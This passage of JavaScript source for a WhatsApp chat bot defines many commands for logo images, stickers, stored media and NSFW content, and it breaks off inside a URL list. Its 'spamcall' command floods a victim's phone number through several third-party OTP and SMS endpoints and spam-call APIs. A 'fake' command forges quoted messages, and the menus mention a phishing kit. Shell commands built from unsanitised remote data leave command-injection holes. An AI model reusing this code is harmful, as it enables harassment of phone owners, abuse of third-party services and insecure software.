                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                    case 'socialfishv2':

                    client.sendMessage(from, socialfishv2(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                    case 'terkeytermux':

                    client.sendMessage(from, terkeytermux(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                case 'glitch':
					var gh = body.slice(8)
					var tels3 = gh.split("|")[0];
					var tels4 = gh.split("|")[1];
					if (args.length < 1) return reply(mess.blank)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=glitch&text1=${tels3}&text2=${tels4}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'party':
					if (args.length < 1) return reply(mess.blank)
					part = body.slice(7)
					if (part.length > 20) return reply('O texto é muito longo, até 20 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {caption: 'Aqui mana', quoted: mek})
					break
				case 'rtext':
					if (args.length < 1) return reply(mess.blank)
					tels5 = body.slice(7)
					if (tels5.length > 10) return reply('O texto é longo, com até 10 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/romancetext?text=${tels5}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: tels5})
					break
				case 'water':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(7)
					if (tels.length > 15) return reply('O texto é muito longo, até 20 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tfire?text=${tels}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'firetext':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(7)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tlight?text=${tels}&apikey=xptnbot352`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'textolaf':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=metal_dark_gold&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'textblue':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'textsky':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://hujanapi.herokuapp.com/api/sky_online?text=${tels}&apiKey=freetrial`, {method: 'get'})
					buff = await getBuffer(anu.result.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'texteng':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=sand_engraved&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
                case 'wolflogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(9)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=wolflogo1&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
					case 'spamcall':
          if (!isPremium) return reply(mess.only.premi)
          reply('Espere..')
                                       if (args[0].startsWith('08')) return reply('Use o prefixo número 8/n ex : *8796662*')
                                       if (args[0].startsWith('82255123081')) return reply('Falha ao ligar para o número do bot')
                                       if (args[0].startsWith('82387804410')) return reply('Falha ao ligar para o número do proprietário')
                                       var data = body.slice(10)
                                       await fetchJson(`https://core.ktbs.io/v2/user/registration/otp/62`+data, {method: 'get'})
                                       await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=`+data, {method: 'get'})
                                       await fetchJson(`https://api.danacita.co.id/users/send_otp/?mobile_phone=62`+data, {method: 'get'})
                                       await fetchJson(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0`+data, {method: 'get'})
                                       await fetchJson(`https://api-zeks.harispoppy.com/api/spamcall?no=`+data+`&apikey=apivinz`, {method: 'get'})
                                       break
                case 'lionlogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(9)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=lionlogo&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
			    case 'fakereplay':
                   client.reply(from, 'ange mas', 'mending lari', "0816-5466368")
                   break
				case 'infogc':
				client.updatePresence(from, Presence.composing)
				if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await client.getProfilePicture(from)
				} catch {
					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
				}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nome do grupo :* ${groupName}\n*Descrição :* ${groupDesc}\n*Número de Administradores :* ${groupAdmins.length}\n*Número de membros :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					client.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
			    case 'owner':
                    client.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
                    client.sendMessage(from, 'Ctt do meu dono ai, pfv n flode o chat',MessageType.text, { quoted: mek} )
                    break
                case 'fitnah':	
				case 'fake':          
                    if (!isGroup) return reply(mess.only.group)
                    arg = body.substring(body.indexOf(' ') + 1)
				    isi = arg.split(' |')[0] 
			        pesan = arg.split('|')[1] 
				    pesan2 = arg.split('|')[2] 
                    costum(pesan, isi, pesan2)
                    break
				case 'info':
					me = client.user
					uptime = process.uptime()
					teks = `*Nome do bot* : ${me.name}\n*Número do bot* : @${me.jid.split('@')[0]}\n*Prefixo* : ${prefix}\n*Contatos bloqueados* : ${blocked.length}\n*O bot está ativo em* : ${kyun(uptime)}\n\n*Digite .dono para ver a info do dono*`
					buffer = await getBuffer(me.imgUrl)
					client.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
				case 'addaud':
					if (!isOwner) return reply(mess.only.ownerB)				
                    if (!isPremium) return reply(mess.only.premium)
					if (!isQuotedAudio) return reply('Marque o áudio e coloque o nome dele!')
					svst = body.slice(7)
					if (!svst) return reply('Qual é o nome do áudio??')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					client.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break
				case 'getaud':
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
					client.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
				case 'listaud':
				case 'audlist':

					teks = '*Lista de áudios:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
				case 'addimagem':
					if (!isOwner) return reply(mess.only.ownerB)				
                    if (!isPremium) return reply(mess.only.premium)
					if (!isQuotedImage) return reply('Marque a imagem e digita o nome!')
					svst = body.slice(10)
					if (!svst) return reply('Qual é o nome da imagem?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					client.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
				case 'getimagem':
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					client.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
				case 'imagemlist':
				case 'listimagem':

					teks = '*Lista Imagens:*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
				case 'addvideo':
					if (!isOwner) return reply(mess.only.ownerB)				
                    if (!isPremium) return reply(mess.only.premium)
					if (!isQuotedVideo) return reply('Marque o vídeo e digite o nome!')
					svst = body.slice(10)
					if (!svst) return reply('Qual é o nome do vídeo?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					client.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
				case 'getvideo':
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					client.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
				case 'listvideo':
				case 'videolist':

					teks = '*Lista de Videos :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break						
                case 'blowjob':
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=${TobzKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
				case 'bloqueados':
					teks = 'Esta é a lista de números bloqueados :\n'
					for (let block of blocked) {
						teks += `~> @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break
				case 'leens':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						reply(mess.wait)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Só uma foto mano')
					}
					break
				case 'figugif':
				case 'gif':
				case 'g':
					if (!isGroup) return reply(mess.only.group)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`❌ Falhou, no momento da conversão ${tipe} para o adesivo`)
							})
							.on('end', function () {
								console.log('Finish')
								client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(mess.wait)
						keyrmbg = 'Your-ApiKey'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Falha, ocorreu um erro, tente novamente mais tarde.')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								client.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: mek})
							})
						})
					/*} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.on('start', function (cmd) {
								console.log('Started :', cmd)
							})
							.on('error', function (err) {
								fs.unlinkSync(media)
								console.log('Error :', err)
							})
							.on('end', function () {
								console.log('Finish')
								fs.unlinkSync(media)
								client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)*/
					} else {
						reply(`Envie fotos com legendas *.g* ou marque um vídeo que já foi enviada`)
					}
					break
				case 'f': 
				case 'fig':
				case 'figu': 
					if (!isGroup) return reply(mess.only.group)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(ind.stikga)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
									//if (error) {
											// reply(ind.stikga())
											// fs.unlinkSync(media)	
											// fs.unlinkSync(ran)
											// }
									client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(ind.wait())
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`❌ Falha, no momento da conversão ${tipe} para o adesivo`)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
									//if (error) {
											// reply(ind.stikga())
											// fs.unlinkSync(media)	
											// fs.unlinkSync(ran)
											// }
									client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else {
						reply(`Envie fotos/vídeos com legendas ${prefix}figu ou marque um video/imagem`)
					}
					break
				case 'tts':
					if (args.length < 1) return client.sendMessage(from, 'Qual é o código da linguagem, tio?', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return client.sendMessage(from, 'Cadê o texto tio', text, {quoted: mek})
					dtt = body.slice(9)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('A maior parte do texto é merda')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('falha:(')
							client.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
				case 'shadow': 
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					shad = body.slice(8)
					reply(mess.wait)
					ssha = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/photooxy/shadowtext?text=${shad}`)
					client.sendMessage(from, ssha, image, {caption: 'Nihkkkak', quoted: mek})
					break
				case 'minion':
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					minio = body.slice(8)
					reply(mess.wait)
					minn = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/miniontext?text=${minio}`)
					client.sendMessage(from, minn, image, {caption: 'Nihhjmmak', quoted: mek})
					break
				case 'neon':
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					nneoo = body.slice(6)
					reply(mess.wait)
					nooe = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/neontext?text=${nneoo}`)
					client.sendMessage(from, nooe, image, {caption: 'Nihjjkkak', quoted: mek})
					break
				case 'neongreen': 
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					grre = body.slice(11)
					reply(mess.wait)
					gree = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/greenneontext?text=${grre}`)
					client.sendMessage(from, gree, image, {caption: 'Njkkkak', quoted: mek})
					break
				case 'neon2':
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					duadua = body.slice(7)
					reply(mess.wait)
					duaa = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/neonwithgalaxytext?text=${duadua}`)
					client.sendMessage(from, duaa, image, {caption: 'kkkkkk', quoted: mek})
					break
				case '3d':
				if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(mess.blank)
					dimen = body.slice(4)
					reply(mess.wait)
					tigaa = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/3dgradientstext?text=${dimen}`)
					client.sendMessage(from, tigaa, image, {caption: 'kkksk', quoted: mek})
					break
				case 'walpaperanime':
				    try {
			    	if (!isOwner) return reply(mess.only.ownerB)
						if (!isNsfw) return reply('❌ *FALSO* ❌')
						res = await fetchJson(`https://wallpaperaccess.com/full/395986.jpg','https://wallpaperaccess.com/full/21628.jpg','https://wallpaperaccess.com/full/21622.jpg','https://wallpaperaccess.com/full/21612.jpg','https://wallpaperaccess.com/full/21611.png','https://wallpaperaccess.com/full/21597.jpg','https://cdn.nekos.life/wallpaper/QwGLg4oFkfY.png','https://wallpaperaccess.com/full/21591.jpg','https://cdn.nekos.life/wallpaper/bUzSjcYxZxQ.jpg','https://cdn.nekos.life/wallpaper/j49zxzaUcjQ.jpg','https://cdn.nekos.life/wallpaper/YLTH5KuvGX8.png','https://cdn.nekos.life/wallpaper/Xi6Edg133m8.jpg','https://cdn.nekos.life/wallpaper/qvahUaFIgUY.png','https://cdn.nekos.life/wallpaper/leC8q3u8BSk.jpg','https://cdn.nekos.life/wallpaper/tSUw8s04Zy0.jpg','https://cdn.nekos.life/wallpaper/sqsj3sS6EJE.png','https://cdn.nekos.life/wallpaper/HmjdX_s4PU4.png','https://cdn.nekos.life/wallpaper/Oe2lKgLqEXY.jpg','https://cdn.nekos.life/wallpaper/GTwbUYI-xTc.jpg','https://cdn.nekos.life/wallpaper/nn_nA8wTeP0.png','https://cdn.nekos.life/wallpaper/Q63o6v-UUa8.png','https://cdn.nekos.life/wallpaper/ZXLFm05K16Q.jpg','https://cdn.nekos.life/wallpaper/cwl_1tuUPuQ.png','https://cdn.nekos.life/wallpaper/wWhtfdbfAgM.jpg','https://cdn.nekos.life/wallpaper/3pj0Xy84cPg.jpg','https://cdn.nekos.life/wallpaper/sBoo8_j3fkI.jpg','https://cdn.nekos.life/wallpaper/gCUl_TVizsY.png','https://cdn.nekos.life/wallpaper/LmTi1k9REW8.jpg','https://cdn.nekos.life/wallpaper/sbq_4WW2PUM.jpg','https://cdn.nekos.life/wallpaper/QOSUXEbzDQA.png','https://cdn.nekos.life/wallpaper/khaqGIHsiqk.jpg','https://cdn.nekos.life/wallpaper/iFtEXugqQgA.png','https://cdn.nekos.life/wallpaper/deFKIDdRe1I.jpg','https://cdn.nekos.life/wallpaper/OHZVtvDm0gk.jpg','https://cdn.nekos.life/wallpaper/YZYa00Hp2mk.jpg','https://cdn.nekos.life/wallpaper/R8nPIKQKo9g.png','https://cdn.nekos.life/wallpaper/_brn3qpRBEE.jpg','https://cdn.nekos.life/wallpaper/ADTEQdaHhFI.png','https://cdn.nekos.life/wallpaper/MGvWl6om-Fw.jpg','https://cdn.nekos.life/wallpaper/YGmpjZW3AoQ.jpg','https://cdn.nekos.life/wallpaper/hNCgoY-mQPI.jpg','https://cdn.nekos.life/wallpaper/3db40hylKs8.png','https://cdn.nekos.life/wallpaper/iQ2FSo5nCF8.jpg','https://cdn.nekos.life/wallpaper/meaSEfeq9QM.png','https://cdn.nekos.life/wallpaper/CmEmn79xnZU.jpg','https://cdn.nekos.life/wallpaper/MAL18nB-yBI.jpg','https://cdn.nekos.life/wallpaper/FUuBi2xODuI.jpg','https://cdn.nekos.life/wallpaper/ez-vNNuk6Ck.jpg','https://cdn.nekos.life/wallpaper/K4-z0Bc0Vpc.jpg','https://cdn.nekos.life/wallpaper/Y4JMbswrNg8.jpg','https://cdn.nekos.life/wallpaper/ffbPXIxt4-0.png','https://cdn.nekos.life/wallpaper/x63h_W8KFL8.jpg','https://cdn.nekos.life/wallpaper/lktzjDRhWyg.jpg','https://cdn.nekos.life/wallpaper/j7oQtvRZBOI.jpg','https://cdn.nekos.life/wallpaper/MQQEAD7TUpQ.png','https://cdn.nekos.life/wallpaper/lEG1-Eeva6Y.png','https://cdn.nekos.life/wallpaper/Loh5wf0O5Aw.png','https://cdn.nekos.life/wallpaper/yO6ioREenLA.png','https://cdn.nekos.life/wallpaper/4vKWTVgMNDc.jpg','https://cdn.nekos.life/wallpaper/Yk22OErU8eg.png','https://cdn.nekos.life/wallpaper/Y5uf1hsnufE.png','https://cdn.nekos.life/wallpaper/xAmBpMUd2Zw.jpg','https://cdn.nekos.life/wallpaper/f_RWFoWciRE.jpg','https://cdn.nekos.life/wallpaper/Y9qjP2Y__PA.jpg','https://cdn.nekos.life/wallpaper/eqEzgohpPwc.jpg','https://cdn.nekos.life/wallpaper/s1MBos_ZGWo.jpg','https://cdn.nekos.life/wallpaper/PtW0or_Pa9c.png','https://cdn.nekos.life/wallpaper/32EAswpy3M8.png','https://cdn.nekos.life/wallpaper/Z6eJZf5xhcE.png','https://cdn.nekos.life/wallpaper/xdiSF731IFY.jpg','https://cdn.nekos.life/wallpaper/Y9r9trNYadY.png','https://cdn.nekos.life/wallpaper/8bH8CXn-sOg.jpg','https://cdn.nekos.life/wallpaper/a02DmIFzRBE.png','https://cdn.nekos.life/wallpaper/MnrbXcPa7Oo.png','https://cdn.nekos.life/wallpaper/s1Tc9xnugDk.jpg','https://cdn.nekos.life/wallpaper/zRqEx2gnfmg.jpg','https://cdn.nekos.life/wallpaper/PtW0or_Pa9c.png','https://cdn.nekos.life/wallpaper/0ECCRW9soHM.jpg','https://cdn.nekos.life/wallpaper/kAw8QHl_wbM.jpg','https://cdn.nekos.life/wallpaper/ZXcaFmpOlLk.jpg','https://cdn.nekos.life/wallpaper/WVEdi9Ng8UE.png','https://cdn.nekos.life/wallpaper/IRu29rNgcYU.png','https://cdn.nekos.life/wallpaper/LgIJ_1AL3rM.jpg','https://cdn.nekos.life/wallpaper/DVD5_fLJEZA.jpg','https://cdn.nekos.life/wallpaper/siqOQ7k8qqk.jpg','https://cdn.nekos.life/wallpaper/CXNX_15eGEQ.png','https://cdn.nekos.life/wallpaper/s62tGjOTHnk.jpg','https://cdn.nekos.life/wallpaper/tmQ5ce6EfJE.png','https://cdn.nekos.life/wallpaper/Zju7qlBMcQ4.jpg','https://cdn.nekos.life/wallpaper/CPOc_bMAh2Q.png','https://cdn.nekos.life/wallpaper/Ew57S1KtqsY.jpg','https://cdn.nekos.life/wallpaper/hVpFbYJmZZc.